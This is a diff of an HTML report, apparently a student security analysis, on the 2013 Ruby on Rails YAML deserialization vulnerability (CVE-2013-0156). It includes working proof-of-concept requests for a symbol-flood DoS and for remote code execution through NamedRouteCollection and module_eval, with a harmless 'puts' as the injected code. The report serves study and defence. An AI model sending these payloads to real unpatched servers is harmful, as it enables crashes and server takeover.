@@ -3,6 +3,15 @@
 <head>
 <meta charset="utf-8"/>
 <link rel="stylesheet" href="assets/css/styles.css"/>
+<link rel="stylesheet" href="http://yandex.st/highlightjs/6.1/styles/github.min.css"/>
+<script src="http://yandex.st/highlightjs/6.1/highlight.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
+<script type="text/javascript">
+var hilight_hljs = function(){
+  $('pre code').each(function(i, e){hljs.highlightBlock(e, '  ');});
+};
+$(function(){ hilight_hljs(); });
+</script>
 </head>
 <body>
 <h1 id="ruby-on-rails-parsing-vulnerabilities">Ruby on Rails parsing vulnerabilities</h1>
@@ -17,7 +26,7 @@
 
 <p>Yukihiro Matsumoto (creator of Ruby)</p>
 
-<p>Ruby is a high level general purpose language that is often described as fun and productive to program in. The question is, however, does this fun and productivity come at a price? Your job isn’t so fun once the security implications come back to haunt you.</p>
+<p>Ruby is a high level general purpose language that is often described as fun and productive to program in. The question is: does this fun and productivity come at a price? No job is fun when there are security implications that will come back to haunt you.</p>
 
 <p>Ruby on Rails is as of today one of the most popular frameworks for web application development. As the name suggests, it is implemented in Ruby.</p>
 
@@ -27,40 +36,100 @@
 
 <h3 id="the-ruby-programming-language">The Ruby programming language</h3>
 
-<p>Ruby is a high-level language, created by Yukihiro Matsumoto for the purpose of making programming fun and productive. As of today, it is the second most popular language on GitHub, and is often attributed as a language especially suited to web programming.</p>
+<p>As of today, it is the second most popular language on GitHub, and is often attributed as a language especially suited to web programming.</p>
 
-<h4 id="syntax-and-features">Syntax and features</h4>
+<h4 id="arrays-and-hashes">Arrays and hashes</h4>
 
-<p>Ruby is an object oriented language, with a rich feature set and native syntactic support for data structures such as arrays and hashes. The design goal of Ruby, to make programming fun, has resulted in a very rich and expressive syntax, which in many cases reads almost like natural language.</p>
+<p>Ruby is an object oriented language, with a rich feature set and native syntactic support for the most common data structures. </p>
+
+<pre><code class="language-ruby">["an", "array", "of", "strings"]
+
+{ :a =&gt; "hash", :from =&gt; "symbols", :to =&gt; "strings" }
+</code></pre>
+
+<p>Hashes in Ruby are natively supported key-value mappings. Like in C++, it is possible to create classes that are hash-like, by defining the <code>[](key)</code> and <code>[]=(key, value)</code> methods.</p>
+
+<h4 id="symbols">Symbols</h4>
+
+<p>Ruby symbols are names prepended with a colon (<code>:</code>). They play the same role as atoms in Erlang and are often described as “light-weight strings”. They are often used as keys in hashes. </p>
+
+<p>Symbol names can only contain spaces and other special caracters, but only if the colon is prepended to a string, as such: </p>
+
+<pre><code class="language-ruby">:a_symbol
+
+:"Also a symbol."
+</code></pre>
+
+<h4 id="type-system">Type system</h4>
+
+<p>The Ruby type system employs what is referred to as “duck typing”, which means that the type system in general is very unrestrictive. The types of parameters and return values are kept entirely implicit.</p>
 
 <h4 id="metaprogramming">Metaprogramming</h4>
 
-<p>A notable language feature of Ruby is its fundamental support for metaprogramming, which among other things enables the definition of new classes and methods during runtime. The cornerstone of this feature is the support for runtime evaluation of code. Apart from the <code>eval</code> function provided by most popular scripting languages, Ruby also provides <code>instance_eval</code>, <code>class_eval</code>, and <code>module_eval</code> for evaluating code in the context of a given object, class or module.</p>
+<p>A programming idiom that is very prominent within the Ruby community is the concept of metaprogramming. Since Ruby code is evaluated as it is being parsed (as opposed to other languages such as JavaScript which uses several passes), it is possible to define new classes during runtime.</p>
+
+<p>Ruby also provides granular tools for runtime evaluation of code. Apart from the <code>eval</code> function provided by most popular scripting languages, Ruby also provides <code>instance_eval</code>, <code>class_eval</code>, and <code>module_eval</code> for evaluating code in the context of a given object, class or code module. </p>
+
+<p>The method <code>bar</code> in the class <code>Foo</code> could be defined as such:</p>
+
+<pre><code>class Foo
+  def bar
+    "baz"
+  end
+end
+</code></pre>
+
+<p>But it could also be defined as:</p>
+
+<pre><code>x = "bar"
+class Foo
+  class_eval &lt;&lt;EOS
+    def #{x}
+      "baz"
+    end
+  EOS
+end
+</code></pre>
+
+<p>The <code>#{}</code> is used for string interpolation, and the <code>&lt;&lt;</code> is used to define a multi-line string with a custom end marker, in this case <code>EOS</code>.</p>
+
+<p>In most other languages, runtime evaluation tools are kept at arms length due to the inherent risk of evaluating untrusted code. In Ruby however, it is not uncommon to make use of the <code>eval</code>-methods.</p>
+
+<h4 id="rubygems">Rubygems</h4>
+
+<p>The Ruby community uses a centralized repository at <code>http://rubygems.org</code> to distribute code modules known as <code>gems</code>. Installing a gem deployed to Rubygems is as easy as running: <code>gem install [gemname]</code>.</p>
 
 <h3 id="the-ruby-on-rails-web-application-framework">The Ruby on Rails web application framework</h3>
 
-<p>Ruby on Rails, often referred to as Rails or RoR, is a web application development framework for Ruby.</p>
+<p>Ruby on Rails, often referred to as Rails or RoR, is a web application development framework for Ruby. </p>
 
-<p>The design of the framework is heavily inspired by the Model-View-Controller pattern.</p>
+<p>The tagline of Rails is “convention over configuration”, which in practice means that the programmer is expected to structure the application in a certain way, but in return gets a lot of functionality provided by default.</p>
 
-<p>An essential building block of Rails application are models. Models are ruby classes that persist to and act on data in the application database. Rails models follow the common pattern of mapping classes to database tables, and objects to database rows.</p>
+<p>One such default functionality in Rails is middleware, which is code that is executed on every incoming request, to handle things such as parsing and loading relevant data from the database before control is passed to a handler method in a controller. </p>
 
-<p>If models are used to model domain logic in a Rails application, then controllers are most certainly used to define server logic and request handling. Controllers are basically classes that define handlers for incoming requests to different URL:s. It is common to define a separate controller method for every HTTP route that the application responds to.</p>
+<p>Rails uses the common Model-View-Controller pattern, where domain data is kept in models, request handlers are defined in controllers and markup is defined in views. </p>
 
-<p>Which route is handled by which controller is decided by the Rails router. The router basically defines the mapping between different routes and their respective controller method handlers.</p>
+<p>Which controller method gets to handle which incoming request is defined by the Rails router. The router is basically a mapping between different HTTP routes and controller method handlers. An example route could be:</p>
 
-<p>Views in Rails work like in most other web application frameworks and are of no concern to us.</p>
+<pre><code>match "/students/:id" =&gt; "students#show"
+</code></pre>
 
-<p>(routes)</p>
+<p>This means that the <code>students/id</code> route will be handled by the <code>show</code>-method in the <code>students</code>-controller.</p>
 
-<p>(controllers)</p>
+<h4 id="rails-metaprogramming">Rails metaprogramming</h4>
 
-<p>(middleware)</p>
+<p>Rails makes heavy use of metaprogramming as a way of avoiding code repetition. It is not uncommon to see code such as this:</p>
+
+<pre><code>%w(&lt;&lt; concat push insert unshift).each do |method|
+  class_eval &lt;&lt;-METHOD, __FILE__, __LINE__ + 1
+    def #{method}(*args)
+      paths.#{method}(*typecast(args))
+    end
+  METHOD
+end
+</code></pre>
 
 <h2 id="yaml">YAML</h2>
-
-<p>What It Is: YAML is a human friendly data serialization
-  standard for all programming languages.</p>
 
 <p>As explained on the official homepage, YAML is a markup language for describing serialized data that is designed to be human-readable.</p>
 
@@ -68,20 +137,34 @@
 
 <p>YAML is programming language agnostic, but has built in features for describing objects. For example, a simple Ruby object can be described in YAML as:</p>
 
-<p>!ruby/object:Foo
-bar: baz</p>
+<pre><code class="language-yaml">!ruby/object:Foo
+bar: baz
+</code></pre>
 
 <p>This is equivalent to an object of class <code>Foo</code>, which has a property <code>bar</code> with the value <code>baz</code>.</p>
 
-<p>Ruby provides tools for deserializing serialized YAML objects during runtime, using the method <code>YAML::load</code>. Calling <code>YAML::load</code> with our <code>Foo</code> object would result in a Foo object being instantiated.</p>
+<p>Ruby provides tools for deserializing serialized YAML objects during runtime, using the method <code>YAML::load</code>. Calling <code>YAML::load</code> with our <code>Foo</code> object would result in a Foo object being instantiated:</p>
+
+<pre><code>foo = YAML::load &lt;&lt;EOS
+  +ruby/object:Foo
+  bar: baz
+EOS
+foo.bar == "baz" # true
+</code></pre>
 
 <p>Since YAML:s syntactic support for data structures and objects matches that of Ruby, it has become something of a de facto serialization format within the Ruby community.</p>
 
 <h2 id="exploit">Exploit</h2>
 
-<p>“There are multiple weaknesses in the parameter parsing code for Ruby on Rails which allows attackers to bypass authentication systems, inject arbitrary SQL, inject and execute arbitrary code, or perform a DoS attack on a Rails application.” - Aaron Patterson, a developer for Ruby on Rails</p>
+<blockquote>
+  <p>“There are multiple weaknesses in the parameter parsing code for Ruby on Rails which allows attackers to bypass authentication systems, inject arbitrary SQL, inject and execute arbitrary code, or perform a DoS attack on a Rails application.” </p>
+</blockquote>
 
-<p>The exploit was first described in a post<sup id="fnref:1"><a href="#fn:1" class="footnote">1</a></sup> by Aaron Patterson in January 2013. Because of the severity of the problems found he suggests that applications running an affected release should be upgraded or fixed immediately. The post suggests different fixes depending on RoR version and what modules the application uses. One fix is to disable YAML type conversion when parsing XML.</p>
+<p>Aaron Patterson (Ruby on Rails developer)</p>
+
+<p>The vulnerability in questions was first described in a security bulletin<sup id="fnref:1"><a href="#fn:1" class="footnote">1</a></sup> by Aaron Patterson in January 2013. </p>
+
+<p>Because of the severity of the problems found he suggests that applications running an affected release should be upgraded or fixed immediately. The post suggests different fixes depending on RoR version and what modules the application uses. One fix is to disable YAML type conversion when parsing XML.</p>
 
 <p>Many articles have been written on the subject after the initial post such as <sup id="fnref:3"><a href="#fn:3" class="footnote">2</a></sup>, <sup id="fnref:4"><a href="#fn:4" class="footnote">3</a></sup>, <sup id="fnref:5"><a href="#fn:5" class="footnote">4</a></sup>. [^3] talks about how the exploit affects websites using RoR and even those that is connected to one, since a compromised server could be used by an attacker to perform cross-site scripting. The article also mentions that almost all servers running a RoR application at the time was affected, which yields how massive impact it had on the RoR community and ultimately on the future of RoR.</p>
 
@@ -89,58 +172,86 @@ bar: baz</p>
 
 <p>To examine the exploit by identifying what makes it possible and what have been done on later patches to avoid it, while also considering one of Ruby on Rails leading design paradigm “convention over configuration” and its benefits and drawbacks.</p>
 
-<h2 id="method">Method</h2>
+<h3 id="method">Method</h3>
+
+<p>To examine the exploit by identifying what makes it possible and what have been done on later patches to avoid it, while also considering one of Ruby on Rails leading design paradigm “convention over configuration” and its benefits and drawbacks.</p>
 
 <p>In order to examine the exploit in detail one will need an environment which is vulnerable to the exploit. A proof of concept exploit can then be set up to show what is actually possible to do on the server. Now follows a more detailed plan on how a vulnerable system will be configured and analyzed.</p>
 
-<h2 id="construct-a-vulnerable-environment">Construct a vulnerable environment</h2>
-
-<p>According to the post[^1] on Google Groups by Aaron Patterson, the versions which are not vulnerable to the exploit are 3.2.11, 3.1.10, 3.0.19 and 2.3.15 and all others would be vulnerable. Another article<sup id="fnref:2"><a href="#fn:2" class="footnote">5</a></sup> on the subject points out that the version of Ruby needs to be higher than 1.9.2.
-The current version of Ruby is 1.9.3, so that would be the preferred choice. All that is needed for the exploit to work is a running environment of RoR with one of the above mentioned versions and that the Ruby language with version 1.9.3 is installed - all vulnerable classes and tools are included. Also, Git will be used to assist when working with the system.</p>
-
-<h2 id="create-a-proof-of-concept-exploit">Create a proof of concept exploit</h2>
-
-<p>In order to create a proof of concept exploit the different parts of the exploit need to be identified and verified to work on the chosen environment. Information on all steps that is needed will be gathered from articles and discussion such as [^2].</p>
-
-<h2 id="analyze-the-exploit">Analyze the exploit</h2>
+<h4 id="analyze-the-exploit">Analyze the exploit</h4>
 
 <p>After the proof of concept exploit is constructed, the different parts of it will be analyzed in order to receive deeper knowledge on the subject.</p>
 
-<h2 id="analyze-the-vulnerable-code">Analyze the vulnerable code</h2>
+<h4 id="analyze-the-vulnerable-code">Analyze the vulnerable code</h4>
 
 <p>The vulnerable code will be analyzed and ultimately answer the question on how the exploit is possible. This is a natural step after going through the proof of concept exploit since the it is heavily dependent on the code it exploits.</p>
 
-<h2 id="analyze-the-security-patches">Analyze the security patches</h2>
+<h4 id="analyze-the-security-patches">Analyze the security patches</h4>
 
 <p>To answer the question on what have been done to avoid this exploit some of the security patches will be analysed. By running the command ‘git diff v3.2.10 v3.2.11’ one can identify all parts of the code that have been changed between two versions, in this case 3.2.10 and 3.2.11. This will help in finding out what the security team of RoR have done to stop the attack and maybe also if they have tracked down similar issues.</p>
 
-<h2 id="results">Results</h2>
+<h2 id="description-of-work">Description of work</h2>
 
-<h2 id="the-vulnerable-environment">The vulnerable environment</h2>
+<h3 id="constructing-a-vulnerable-environment">Constructing a vulnerable environment</h3>
 
-<p>Links to our repository and information on that</p>
+<p>According to Aaron Patterson’s security bulletin[^1], all versions below <code>3.2.11</code> are affected by the vulnerability. Constructing a vulnerable application thus requires version <code>3.2.10</code> or below.</p>
 
-<h2 id="proof-of-concept-exploit">Proof of concept exploit</h2>
+<p>Another article on the subject<sup id="fnref:2"><a href="#fn:2" class="footnote">5</a></sup> points out that the version of Ruby needs to be higher than <code>1.9.2</code>, we will thus use the latest patch of version <code>1.9.3</code>, which to date is <code>1.9.3-p392</code>.</p>
 
-<h2 id="analysis">Analysis</h2>
+<p>To setup a default application, we create a <code>Gemfile</code> which specifies this version of rails, and then use the <code>bundler</code> gem to install our dependencies:</p>
 
-<h2 id="analysis-of-exploit">Analysis of exploit</h2>
+<pre><code># Gemfile
+source 'https://rubygems.org'
+gem 'rails', '3.2.10'
+</code></pre>
 
-<p>Our final exploit payload looks like this in its entirety:</p>
+<p>We will use the <code>bundler</code> gems <code>exec</code> functionality to make sure that we run the correct version of the Rails binary:</p>
 
-<pre><code>POST /index.html HTTP/1.1
-Host: localhost
-Content-Type: text/xml
-X-HTTP-Method-Override: GET
+<pre><code>bundle install --path vendor/bundle
+bundle exec rails new . --skip-bundle
+</code></pre>
 
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;exploit type="yaml"&gt;--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
-? ! 'foo
+<p>This leaves us with a default application, which can be run using:</p>
 
-  (100.times { puts ''hej'' }; @executed = true) unless @executed
+<pre><code>bundle exec rails server
+</code></pre>
 
+<p>By visiting <code>localhost:3000</code>, we now see the welcome page for a default Rails application.</p>
+
+<h3 id="creating-a-proof-of-concept-exploit">Creating a proof of concept exploit</h3>
+
+<p>A concise example of the exploit is detailed in a blog entry by one of the members of <em>Rapid7</em>, creators of the popular exploit framework <code>Metasploit</code><sup id="fnref:7"><a href="#fn:7" class="footnote">6</a></sup>.</p>
+
+<p>By sending the following payload in a <code>POST</code>-request, the <code>Time</code> object described as <code>YAML</code> will be deserialized and evaluated:</p>
+
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;exploit type="yaml"&gt;--- !ruby/object:Time {}
+&lt;/exploit&gt;
+</code></pre>
+
+<p>The fact that we can have <code>YAML</code> objects deserialized on the server does not however directly imply that we can have arbitrary code executed. However, after knowledge about the vulnerability became public, it seems that its severity increased as various security enthusiasts devised increasingly harmful exploits, ranging from simple <code>DoS</code> attacks, to <code>SQL</code> injections and finally <code>RCE</code>, remote code execution. </p>
+
+<p>Examples of these attacks are provided by blogger under the alias <em>ronin</em><sup id="fnref:8"><a href="#fn:8" class="footnote">7</a></sup>. Here is a simple example of how a DoS attack can be mounted by just by having <code>YAML</code> deserialized:</p>
+
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;exploit type="yaml"&gt;---:foo1: true
+  :foo2: true
+  :foo3: true
+  &lt;!-- ... --&gt;
+  :foo1000000: true
+  &lt;!-- ... --&gt;
+&lt;/exploit&gt;
+</code></pre>
+
+<p>Since symbols are never garbage collected once defined, the deserialization of this payload will result in the symbol table overflowing and the application crashing. We see that the possibility of having arbitrary <code>YAML</code> deserialized on the server is a clear vulnerability. Still, in order to achieve remote code execution, yet another vulnerability must be exploited.</p>
+
+<p>Not long after the discovery of the vulnerability, a vulnerable class was discovered that when deserialized from <code>YAML</code> could potentially cause untrusted data to be evaluated as code. <em>ronin</em> provides us with a payload that contains such a class:</p>
+
+<pre><code class="language-http">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;exploit type="yaml"&gt;
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+? ! 'foo; puts "Hello world!"
   __END__
-
 '
 : !ruby/struct
   defaults:
@@ -151,45 +262,84 @@ X-HTTP-Method-Override: GET
     :action: create
     :controller: foos
   segment_keys:
-    - :format&lt;/exploit&gt;
+    - :format
+&lt;/exploit&gt;
+</code></pre>
+
+<p>When sent as a <code>POST</code> request to the default route of our application, it causes:</p>
+
+<pre><code>"Hello world!"
+</code></pre>
+
+<p>to be printed in the server console.</p>
+
+<p>We can also get around the fact that the payload must be <code>POST</code>-ed using a special <code>HTTP</code> header:</p>
+
+<pre><code>X-HTTP-Method-Override: GET
+</code></pre>
+
+<h2 id="analysis">Analysis</h2>
+
+<h3 id="analysis-of-exploit">Analysis of exploit</h3>
+
+<p>Our final exploit payload looks like this in its entirety:</p>
+
+<pre><code class="language-http">POST /index.html HTTP/1.1
+Host: localhost
+Content-Type: text/xml
+X-HTTP-Method-Override: GET
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;exploit type="yaml"&gt;
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+? ! 'foo; puts "Hello world!"
+  __END__
+'
+: !ruby/struct
+  defaults:
+    :action: create
+    :controller: foos
+  required_parts: []
+  requirements:
+    :action: create
+    :controller: foos
+  segment_keys:
+    - :format
+&lt;/exploit&gt;
 </code></pre>
 
 <p>We will now make sense of it by picking it apart and analyzing the individual components.</p>
 
 <p>First off, we see that we are dealing with a POST-request, with the exploit payload contained in the body. The payload is meant to be parsed as XML, which is the reason for the content-type header:</p>
 
-<pre><code>Content-Type: text/xml
+<pre><code class="language-http">Content-Type: text/xml
 </code></pre>
 
 <p>By default, Rails does not handle POST-requests unless explicitly told so on a specific route. This means that our payload will not be parsed unless we can find a route on the server that accepts POST requests. Although this might not be hard on most servers, we can make it even easier by simply overriding the POST request to be handled as a GET request. This is the reason for the header:</p>
 
-<pre><code>X-HTTP-Method-Override: GET
+<pre><code class="language-http">X-HTTP-Method-Override: GET
 </code></pre>
 
 <p>Our payload in the request body is an XML-document consisting of one <code>&lt;exploit&gt;</code> tag. By adding a type property, we can make Rails delegate the content of this tag tag to its YAML-parser: </p>
 
-<pre><code>&lt;exploit type="yaml"&gt;
+<pre><code class="language-xml">&lt;exploit type="yaml"&gt;
 </code></pre>
 
 <p>Next follows the YAML-part of our payload, which in all its entirety describes a serialized instance of the Rails class <code>NamedRouteCollection</code>.</p>
 
-<pre><code>--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+<pre><code class="language-yaml">--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
 </code></pre>
 
 <p>The next part is where the fun begins. Our serialized NamedRouteCollection has one key value mapping with the key:</p>
 
-<pre><code>'foo
-
-  (100.times { puts ''hej'' }; @executed = true) unless @executed
-
+<pre><code class="language-yaml">'foo; puts "Hello world!"
   __END__
-
 '
 </code></pre>
 
 <p>and the value:</p>
 
-<pre><code>!ruby/struct
+<pre><code class="language-yaml">!ruby/struct
   defaults:
     :action: create
     :controller: foos
@@ -203,13 +353,13 @@ X-HTTP-Method-Override: GET
 
 <p>It is apparent that our exploit code is contained within the key that maps to a ruby struct. This struct contains a seemingly arbitrary set of properties. What these properties mean and how the code in the key can end up being evaluated will be apparent upon analysis of the vulnerable code that processes this request.</p>
 
-<h2 id="analysis-of-vulnerable-code">Analysis of vulnerable code</h2>
+<h3 id="analysis-of-vulnerable-code">Analysis of vulnerable code</h3>
 
 <p>How every request is handled by Rails is determined by the router, which maps URLs to controller method handlers. As we will see however, our request will never reach a handler before the code in our payload is executed.</p>
 
 <p>Since the exploit will work on any route that responds to GET-requests, we will consider the following route:</p>
 
-<pre><code>root :to =&gt; “application#index”
+<pre><code class="language-ruby">root :to =&gt; "application#index"
 </code></pre>
 
 <p>This means that the root route of our application will be handled by the index method in the <code>Application</code> controller.</p>
@@ -218,8 +368,7 @@ X-HTTP-Method-Override: GET
 
 <p>If we look at the source of this parameter parser, we see that the vulnerable version of Rails defines two default parsers:</p>
 
-<pre><code># actionpack/lib/action_dispatch/middleware/params_parser.rb
-
+<pre><code class="language-ruby"># actionpack/lib/action_dispatch/middleware/params_parser.rb
 DEFAULT_PARSERS = {
       Mime::XML =&gt; :xml_simple,
       Mime::JSON =&gt; :json
@@ -228,13 +377,9 @@ DEFAULT_PARSERS = {
 
 <p>And when the <code>Content-Type</code> of the header is set to XML, the Rails XML parser will be called to parse the body of the request:</p>
 
-<pre><code>mime_type = content_type_from_legacy_post_data_format_header(env) ||
-  request.content_mime_type
+<pre><code># actionpack/lib/action_dispatch/middleware/params_parser.rb
 strategy = @parsers[mime_type]
-return false unless strategy
 case strategy
-when Proc
-  strategy.call(request.raw_post)
 when :xml_simple, :xml_node
   data = Hash.from_xml(request.body.read) || {}
 </code></pre>
@@ -244,28 +389,17 @@ when :xml_simple, :xml_node
 <p>A short look at <code>from_xml</code> reveals that it simply delegates to Rails built in XML parser, <code>XmlMini</code>.</p>
 
 <pre><code># activesupport/lib/active_support/core_ext/hash/conversions.rb
-
 def from_xml(xml)
-  typecast_xml_value(
-    unrename_keys(ActiveSupport::XmlMini.parse(xml))
-  )
+  typecast_xml_value(unrename_keys(ActiveSupport::XmlMini.parse(xml)))
 end
 </code></pre>
 
 <p>To understand how the XML parser results in the contents of the <code>&lt;exploit&gt;</code> tag to be parsed by the YAML parser, we look inside the source of <code>XmlMini</code>.</p>
 
-<pre><code>activesupport/lib/active_support/xml_mini.rb
-
+<pre><code class="language-yaml"># activesupport/lib/active_support/xml_mini.rb
 FORMATTING = {
-      "symbol"   =&gt; Proc.new { |symbol| symbol.to_s },
-      "date"     =&gt; Proc.new { |date| date.to_s(:db) },
-      "datetime" =&gt; Proc.new { |time| time.xmlschema },
-      "binary"   =&gt; Proc.new { |binary| ::Base64.encode64(binary) },
-      "yaml"     =&gt; Proc.new { |yaml| yaml.to_yaml }
-    } unless defined?(FORMATTING)
-
-formatted_value = FORMATTING[type_name] &amp;&amp; !value.nil? ?
-  FORMATTING[type_name].call(value) : value
+  "yaml"     =&gt; Proc.new { |yaml| yaml.to_yaml }
+} unless defined?(FORMATTING)
 </code></pre>
 
 <p>We see that for any XML tag with the <code>type</code> attribute set to <code>yaml</code>, the XML parser will delegate parsing of the tag body to the <code>to_yaml</code> method, which is a general method defined on the <code>Object</code> class, and thus available on all objects.</p>
@@ -276,15 +410,12 @@ formatted_value = FORMATTING[type_name] &amp;&amp; !value.nil? ?
 
 <p>By looking at the source code for <code>NamedRouteCollection</code> we see that <code>[]=</code> is aliased to the <code>add</code> method:</p>
 
-<pre><code>actionpack/lib/action_dispatch/routing/route_set.rb
-
+<pre><code class="language-ruby"># actionpack/lib/action_dispatch/routing/route_set.rb
 class NamedRouteCollection
-
 def add(name, route)
   routes[name.to_sym] = route
   define_named_route_methods(name, route)
 end
-
 alias []= add
 </code></pre>
 
@@ -294,31 +425,31 @@ alias []= add
 
 <p>We are now very close to having our malicious code executed. We need only follow the call chain for <code>define_named_route_methods</code>, which ends up in the <code>define_hash_access</code> method.</p>
 
-<pre><code>def define_hash_access(route, name, kind, options)
-            selector = hash_access_name(name, kind)
+<pre><code>def hash_access_name(name, kind = :url)
+  :"hash_for_#{name}_#{kind}"
+end
 
-# We use module_eval to avoid leaks
+def define_hash_access(route, name, kind, options)
+            selector = hash_access_name(name, kind)
+# ...
+
 @module.module_eval &lt;&lt;-END_EVAL, __FILE__, __LINE__ + 1
   remove_possible_method :#{selector}
-  def #{selector}(*args)
-
-def hash_access_name(name, kind = :url)
-            :"hash_for_#{name}_#{kind}"
-          end
+# ...
 </code></pre>
 
 <p>With our malicious code still in the <code>name</code> variable, the call to <code>module_eval</code> will look something like this with the string interpolations evaluated:</p>
 
 <pre><code>@module.module_eval &lt;&lt;-END_EVAL, __FILE__, __LINE__ + 1
-  remove_possible_method :hash_for_foo; puts “hello”
+  remove_possible_method :hash_for_foo; puts "Hello World!"
 __END__
 </code></pre>
 
-<p>The result being <code>foo</code> printed to the standard out of the running server. The <code>puts “hello”</code> part could however have been much more malicious, had we wanted it to.</p>
+<p>The result being <code>foo</code> printed to the standard out of the running server. The <code>puts "hello"</code> part could however have been much more malicious, had we wanted it to.</p>
 
-<p>We have thus successfully achieved arbitrary code execution.</p>
+<p>We have thus successfully achieved remote code execution.</p>
 
-<h2 id="analysis-of-security-patches">Analysis of security patches</h2>
+<h3 id="analysis-of-security-patches">Analysis of security patches</h3>
 
 <h2 id="conclusions">Conclusions</h2>
 
@@ -342,6 +473,12 @@ __END__
     </li>
     <li id="fn:2">
       <p>http://ronin-ruby.github.io/blog/2013/01/09/rails-pocs.html<a href="#fnref:2" class="reversefootnote">&#8617;</a></p>
+    </li>
+    <li id="fn:7">
+      <p>https://community.rapid7.com/community/metasploit/blog/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156<a href="#fnref:7" class="reversefootnote">&#8617;</a></p>
+    </li>
+    <li id="fn:8">
+      <p>http://ronin-ruby.github.io/blog/2013/01/09/rails-pocs.html<a href="#fnref:8" class="reversefootnote">&#8617;</a></p>
     </li>
   </ol>
 </div>
